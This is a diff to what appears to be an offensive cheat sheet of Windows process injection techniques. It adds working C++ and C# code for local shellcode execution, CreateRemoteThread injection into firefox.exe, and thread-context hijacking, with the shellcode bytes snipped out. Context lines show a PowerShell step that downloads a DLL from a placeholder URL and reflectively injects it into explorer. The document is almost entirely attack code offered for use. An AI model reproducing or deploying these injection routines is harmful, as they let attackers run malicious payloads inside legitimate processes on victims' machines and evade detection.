@@ -1,4 +1,131 @@
-# CreateRemoteThread
+
+[C++ Shellcode Injection Tutorial](https://www.youtube.com/watch?v=FmCDVwA5kYQ&list=PLt9cUwGw6CYF0RprRaBrC7De8_gt2Skov)
+
+# Local Shellcode Injection
+## C++
+```c
+#include <windows.h>
+
+void main() {
+
+	unsigned char payload[] = ....SNIP....
+	unsigned int payloadSize = sizeof(payload);
+
+	void* allocatedMemory = VirtualAlloc(0, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	if (allocatedMemory == 0) return;
+
+	RtlMoveMemory(allocatedMemory, payload, payloadSize);
+
+	DWORD oldProtect = 0;
+	VirtualProtect(allocatedMemory, payloadSize, PAGE_EXECUTE_READ, &oldProtect);
+
+	HANDLE thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)allocatedMemory, 0, 0, 0);
+	if (thread == 0) return;
+
+	WaitForSingleObject(thread, 0);
+}
+```
+
+## CSharp
+```csharp
+using System.Runtime.InteropServices;
+namespace LocalShellcodeInjection
+{
+    class Program
+    {
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)] static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+        [DllImport("kernel32.dll")] static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+        [DllImport("kernel32.dll")] static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+        [DllImport("kernel32.dll")] static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+        static void Main(string[] args)
+        {
+            byte[] buf = new byte[] { ....SNIP.... };
+            int size = buf.Length;
+
+            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)size, 0x3000, 0x4);
+
+            Marshal.Copy(buf, 0, addr, size);
+
+            uint oldProtect;
+            VirtualProtect(addr, (UIntPtr)size, 0x20, out oldProtect);
+
+            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+
+            WaitForSingleObject(hThread, 0xFFFFFFFF);
+        }
+    }
+}
+```
+
+# CreateRemoteThread Injection
+## C++
+```c
+#include <windows.h>
+#include <tlhelp32.h>
+
+/*
+ * EXITFUNC=thread
+ */
+unsigned char payload[] = ....SNIP....;
+int payloadSize = sizeof(payload);
+
+int GetProcessID(LPCWSTR processName)
+{
+	int pid = 0;
+	PROCESSENTRY32 processEntry;
+	processEntry.dwSize = sizeof(PROCESSENTRY32);
+
+	HANDLE hProcessSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+
+	Process32First(hProcessSnapshot, &processEntry);
+	do
+	{
+		if (lstrcmpi(processName, processEntry.szExeFile) == 0)
+		{
+			CloseHandle(hProcessSnapshot);
+			return processEntry.th32ProcessID;
+		}
+	} while (Process32Next(hProcessSnapshot, &processEntry));
+
+	CloseHandle(hProcessSnapshot);
+	return 0;
+}
+
+void Inject(HANDLE process, unsigned char* payload, int payloadSize)
+{
+	LPVOID remoteMemory = VirtualAllocEx(process, NULL, payloadSize, MEM_COMMIT, PAGE_EXECUTE_READ);
+
+	WriteProcessMemory(process, remoteMemory, payload, payloadSize, NULL);
+
+	HANDLE thread = CreateRemoteThread(process, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMemory, NULL, 0, NULL);
+
+	// typedef struct _CLIENT_ID {HANDLE UniqueProcess;HANDLE UniqueThread;} CLIENT_ID, *PCLIENT_ID;
+	// CLIENT_ID cid;
+	// RtlCreateUserThread(process, NULL, FALSE, 0, 0, 0, remoteMemory, 0, &thread, &cid);
+	
+    // NtCreateThreadEx(&thread, GENERIC_ALL, NULL, process, (LPTHREAD_START_ROUTINE) remoteMemory, NULL, NULL, NULL, NULL, NULL, NULL);
+
+	WaitForSingleObject(thread, -1);
+
+	CloseHandle(thread);
+}
+
+void main()
+{
+	wchar_t target[] = L"firefox.exe";
+
+	int pid = 0;
+	pid = GetProcessID(target);
+
+	HANDLE process = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, pid);
+
+	Inject(process, payload, payloadSize);
+
+	CloseHandle(process);
+}
+```
+
+## CSharp
 ```csharp
 using System.Diagnostics;
 using System.Runtime.InteropServices;
@@ -36,7 +163,113 @@ namespace ProcessInjection
 }
 ```
 
-# DLL Injection (from disk)
+# Thread Context Injection (crashes the target process) (C++)
+```c
+#include <windows.h>
+#include <tlhelp32.h>
+
+unsigned char payload[] = ....SNIP....;
+unsigned int payloadSize = sizeof(payload);
+
+int FindTarget(LPCWSTR procname) {
+
+	HANDLE hProcSnap;
+	PROCESSENTRY32 pe32;
+	int pid = 0;
+
+	hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
+
+	pe32.dwSize = sizeof(PROCESSENTRY32);
+
+	if (!Process32First(hProcSnap, &pe32)) {
+		CloseHandle(hProcSnap);
+		return 0;
+	}
+
+	while (Process32Next(hProcSnap, &pe32)) {
+		if (lstrcmpi(procname, pe32.szExeFile) == 0) {
+			pid = pe32.th32ProcessID;
+			break;
+		}
+	}
+
+	CloseHandle(hProcSnap);
+
+	return pid;
+}
+
+
+HANDLE FindThread(int pid) {
+
+	HANDLE hThread = NULL;
+	THREADENTRY32 thEntry;
+
+	thEntry.dwSize = sizeof(thEntry);
+	HANDLE Snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+
+	while (Thread32Next(Snap, &thEntry)) {
+		if (thEntry.th32OwnerProcessID == pid) {
+			hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, thEntry.th32ThreadID);
+			break;
+		}
+	}
+	CloseHandle(Snap);
+
+	return hThread;
+}
+
+int InjectCTX(int pid, HANDLE hProc, unsigned char* payload, unsigned int payload_len) {
+
+	HANDLE hThread = NULL;
+	LPVOID pRemoteCode = NULL;
+	CONTEXT ctx;
+
+	hThread = FindThread(pid);
+	if (hThread == NULL) {
+		return -1;
+	}
+
+	pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
+	WriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T*)NULL);
+
+	SuspendThread(hThread);
+	ctx.ContextFlags = CONTEXT_FULL;
+	GetThreadContext(hThread, &ctx);
+#ifdef _M_IX86 
+	ctx.Eip = (DWORD_PTR)pRemoteCode;
+#else
+	ctx.Rip = (DWORD_PTR)pRemoteCode;
+#endif
+	SetThreadContext(hThread, &ctx);
+
+	return ResumeThread(hThread);
+}
+
+
+int main(void) {
+
+	int pid = 0;
+	HANDLE hProc = NULL;
+
+	pid = FindTarget(L"firefox.exe");
+
+	if (pid) {
+
+		hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
+			PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
+			FALSE, (DWORD)pid);
+
+		if (hProc != NULL) {
+			InjectCTX(pid, hProc, payload, payloadSize);
+			CloseHandle(hProc);
+		}
+	}
+	return 0;
+}
+```
+
+# DLL Injection (from disk) (csharp)
 ```csharp
 using System.Diagnostics;
 using System.Net;
@@ -79,7 +312,7 @@ namespace ProcessInjection
 }
 ```
 
-# Reflective DLL Injection (from memory)
+# Reflective DLL Injection (from memory) (powershell)
 ```powershell
 $bytes = (New-Object System.Net.WebClient).DownloadData("URL/hi.dll")
 $procid = (Get-Process -Name explorer).Id
@@ -88,7 +321,7 @@ Import-Module PATH/Invoke-ReflectivePEInjection.ps1
 Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
 ```
 
-# Process Hollowing
+# Process Hollowing (csharp)
 ```csharp
 using System.Runtime.InteropServices;
 
